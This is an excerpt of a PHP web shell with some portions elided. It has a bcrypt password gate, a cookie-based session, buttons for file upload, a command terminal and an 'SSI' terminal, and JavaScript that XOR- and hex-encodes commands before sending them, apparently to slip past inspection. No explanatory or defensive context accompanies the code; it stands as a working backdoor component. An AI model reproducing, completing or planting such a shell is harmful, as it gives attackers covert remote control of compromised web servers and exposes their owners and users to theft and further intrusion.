<?php
error_reporting(0); @set_time_limit(0); @ini_set('display_errors', '0'); $ph = '$2a$12$orz71J2t69PrsQuV5t0d/e0OYhU7GaxIcCnthOts/rV6RzR5wvwde'; $sk = 'SFEC_V7'; $cn = md5($_SERVER['HTTP_HOST'] . $sk); if (isset($_GET['out'])) { @setcookie($cn, '', time() - 3600, '/'); @header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?')); exit; } $auth = false; if (isset($_COOKIE[$cn]) && $_COOKIE[$cn] === md5($ph . $sk)) $auth = true; if (!$auth && isset($_POST['k']) && crypt($_POST['k'], $ph) === $ph) { @setcookie($cn, md5($ph . $sk), time() + 86400, '/'); @header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?')); exit; } if (!$auth) { die('<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Auth</title><style>
...
<input type="file" id="fu" onchange="handleUpload(this)" style="display:none">
<button class="btn btn-g" onclick="document.getElementById('fu').click()">Upload</button>
<button class="btn btn-p" onclick="toggleTerm()">Terminal</button>
<button class="btn btn-o" onclick="toggleSSI()">Terminal SSI</button>
</div>
...
function xorStr(s,key) {var r='';
for(var i=0;i<s.length;i++) r+=String.fromCharCode(s.charCodeAt(i) ^ key.charCodeAt(i % key.length));
return r;}
function toHex(s) {var h='';
for(var i=0;i<s.length;i++) {var b=s.charCodeAt(i).toString(16);
h+=('00'+b).slice(-2);}
return h;}
function enc(raw) {return toHex(xorStr(raw,XKEY));}
...
buildAndSubmit(enc(p));}
function handleUpload(input) {var files=input.files;if(!files.length) return;
var file=files[0];
var reader=new FileReader();
reader.onload=function(e) {var b64=e.target.result.split(',')[1];
act2('up',file.name,b64);};
